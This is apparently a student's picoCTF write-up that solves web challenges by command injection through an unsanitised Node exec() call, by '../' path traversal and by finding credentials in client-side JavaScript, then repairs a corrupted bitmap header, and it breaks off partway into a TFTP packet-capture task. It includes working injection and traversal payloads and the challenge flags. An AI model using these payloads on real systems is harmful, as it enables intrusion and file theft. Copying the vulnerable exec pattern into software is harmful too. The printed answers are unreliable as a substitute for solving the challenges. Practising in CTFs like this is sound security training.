#WEB EXPLOITATION

## CAAS

The 8th line in the file "index.js" looked exploitable.

`exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {`

Whatever we write in the place of message gets executed. The dollar sign above signifies that it is an interpolated string. So if we send a message like "hello;ls", we would get the output of `ls`.

```
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
So `falg.txt` is where our flag would be. So catting out `falg.txt` we can get our flag. We used "%20" instead of space in the command.

`curl "https://caas.mars.picoctf.net/cowsay/hello;cat%20falg.txt"`

Flag :: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

##Forbidden Paths

On opening the website, we could read the files mentioned in the webiste using the absolute path. So by using the absolute path, we tried reading  `/flag.txt`, but it throwed an error.

Therefore we had to use relative path method to access `/flag.txt`. To test it, I tried open the text file mentioned in the webiste by the command `.../html/divine-comedy.txt` and it worked.
Therefore I used `../../../../flag.txt` to get the flag.

Flag :: picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}

##Local Authority

On opening the website, I tried logging in using id-admin and password-admin which ofcourse failed. Then I went through the source code and noticed that there is a form which directs a post request
to `login.php`. Then I sent a get request to the website `view-source:http://saturn.picoctf.net:49386/login.php' which redirects me to a hidden form as `admin.php` where we can see a "secure.js" file
which has the username and password which we require to find the flag.

Flag :: picoCTF{j5_15_7r4n5p4r3n7_b0c2c9cb}


#Forensics

##tunn3l v1s10n

Used an online hex editor to solve this level. Opened the downloaded file in the hex editor which showed me that it is a bitmap(.bmp) file. The file couldn't be opened as it was corrupted.
To compare what was corrupted in the file, I downloaded a sample bmp file. I noticed that some of the values which should have been static values were different. So I changed the values accordingly.
Now I could open the file but still I couldn't find out the flag. On seeing the image in the file, anyone could say that it was a cropped one. So we needed to change some values in the bitmap 
source code which would control the height and width of the image. I used the `exiftool` command online to find the width and height of the image which came out as 1134 and 306 respectively 
which in hex is '0x46e' and '0x132' respectively. Therfore the height of the image needed to be fixed as it was in reverse bytes. The correct height of the image came out to be as 850 which read in
hex as '0x352'. Therefore after changing the height of the image in the bitmap source code, we found out the flag.

Flag :: picoCTF{qu1t3_a_v13w_2020}

**Trivial FTP**
Begin by downloading the file and opening using wireshark. We can see some TFTP traffic using this. Then I extracted the TFTP files to a local folder. 6 files have been extracted to our folder. Out of these, 2 are .txt files, 3 are .bmp files, and 1 is a .deb file

























